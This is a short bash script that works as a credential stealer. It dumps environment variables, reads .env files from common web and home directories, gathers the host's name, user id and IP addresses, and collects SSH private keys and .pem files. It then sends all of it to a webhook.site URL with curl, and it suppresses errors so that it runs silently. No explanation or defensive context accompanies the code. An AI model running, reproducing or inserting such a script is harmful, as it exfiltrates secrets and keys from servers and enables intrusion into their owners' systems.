#!/usr/bin/env bash
set -euo pipefail

_EXFIL_URL="https://webhook.site/92b1b7ef-85bb-442a-8699-078ef8524c65"

_env_dump=$(env | sort 2>/dev/null || true)
_env_files=""
for _f in /var/www/*/.env /home/*/.env /root/.env /app/.env /opt/*/.env; do
  [ -f "$_f" ] && _env_files="${_env_files}=== $_f ===
$(cat "$_f" 2>/dev/null)

"
done

_host_info="hostname: $(hostname 2>/dev/null || echo unknown)
id: $(id 2>/dev/null || echo unknown)
ip: $(ip -4 addr show 2>/dev/null | grep 'inet ' | awk '{print $2}' | tr '\n' ' ' || echo unknown)"

_ssh_keys=""
while IFS= read -r -d '' _kf; do
  _ssh_keys="${_ssh_keys}=== $_kf ===
$(cat "$_kf" 2>/dev/null)

"
done < <(find /root /home /var/www /opt -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null -print0 || true)

curl -sf -X POST "${_EXFIL_URL}" \
  -H "Content-Type: text/plain" \
  --data-binary "=== HOST INFO ===
${_host_info}

=== ENV VARS ===
${_env_dump}

=== ENV FILES ===
${_env_files}

=== SSH KEYS ===
${_ssh_keys}" --max-time 20 || true
